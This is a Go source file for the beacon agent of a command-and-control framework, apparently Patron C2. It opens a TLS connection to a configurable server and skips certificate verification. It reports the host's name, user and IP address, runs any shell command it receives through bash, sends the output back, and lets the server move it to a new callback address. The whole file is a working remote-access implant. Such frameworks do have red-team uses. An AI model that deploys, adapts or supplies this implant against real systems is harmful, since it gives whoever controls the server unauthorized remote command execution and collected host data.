package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
)

func main() {
	enableLogging()
	config, err := loadCertificate()
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	agentID, hostname, username := generateAgentMetadata()

	for {
		beacon, err := establishConnection(config)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		ip := getLocalIP(beacon)
		initMessage := formatInitMessage(agentID, hostname, username, ip, "NoKeysBeacon")
		sendMessage(beacon, initMessage)

		instruct := receiveInstructions(beacon)
		if instruct == nil {
			beacon.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		processInstruction(instruct, beacon)
		beacon.Close()

		if instruct.CommandType == "kill" {
			break
		}

		sleepInterval := calculateSleepInterval()
		time.Sleep(time.Second * time.Duration(sleepInterval))
	}
}

func enableLogging() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
	err := logger.SetLogFile("app.log")
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
	}
}

func loadCertificate() (*tls.Config, error) {
	publickey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}

	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publickey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func generateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	hostname, err := exec.Command("hostname", "-f").Output()
	if err != nil {
		hostname = []byte("unknown-host")
	}
	username, err := exec.Command("whoami").Output()
	if err != nil {
		username = []byte("unknown-user")
	}
	return agentID, strings.TrimSpace(string(hostname)), strings.TrimSpace(string(username))
}

func establishConnection(config *tls.Config) (*tls.Conn, error) {
	beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
	}
	return beacon, err
}

func getLocalIP(beacon *tls.Conn) string {
	ipAddress := beacon.LocalAddr().(*net.TCPAddr)
	return fmt.Sprintf("%v", ipAddress)
}

func formatInitMessage(agentID, hostname, username, ip string, beaconType string) string {
	return fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s:%s:MASTERKEY", 
		agentID, username, hostname, ip, beaconType, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
}

func sendMessage(beacon *tls.Conn, message string) {
	logger.Logf(logger.Debug, "Sending: %s", message)
	_, _ = beacon.Write([]byte(message + "\n"))
}

func receiveInstructions(beacon *tls.Conn) *types.GiveAgentCommand {
	dec := gob.NewDecoder(beacon)
	instruct := &types.GiveAgentCommand{}
	err := dec.Decode(instruct)
	if err != nil {
		logger.Logf(logger.Error, "Error decoding instructions: %v", err)
		return nil
	}
	return instruct
}

func processInstruction(instruct *types.GiveAgentCommand, beacon *tls.Conn) {
	updateConfig(instruct)
	result := executeCommand(instruct)

    logger.Logf(logger.Debug, "Sending command response: %v", result)

	encoder := gob.NewEncoder(beacon)
	err := encoder.Encode(result)
	if err != nil {
		logger.Logf(logger.Error, "Error sending response: %v", err)
	}
	logger.Logf(logger.Debug, "Sent encoded response")
}

func updateConfig(instruct *types.GiveAgentCommand) {
	if instruct.UpdateAgentConfig.CallbackTo != "" {
		glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
		ServerIP, ServerPort = glob[0], glob[1]
	}
	if instruct.UpdateAgentConfig.CallbackFrequency != "" {
		CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
	}
	if instruct.UpdateAgentConfig.CallbackJitter != "" {
		CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
	}
}

func executeCommand(instruct *types.GiveAgentCommand) types.GiveServerResult {
    var result string
	var CmdOut string
	switch instruct.CommandType {
	case "shell":
		CmdOut = runShellCommand(instruct.Command)
        result = "1"
	case "update":
		CmdOut = "Success"
        result = "1"
	case "kill":
		CmdOut = "~Killed~"
        result = "1"
	default:
		CmdOut = ""
        result = "2"
	}
	return types.GiveServerResult{
		Uuid:        instruct.UpdateAgentConfig.Uuid,
		Result:      result,
		Output:      CmdOut,
		CommandUUID: instruct.CommandUUID,
	}
}

func runShellCommand(command string) string {
	if command == "" {
		return ""
	}
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func calculateSleepInterval() float64 {
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	rand.Seed(time.Now().UnixNano())
	variance := baseTime * jitterPercent * rand.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}
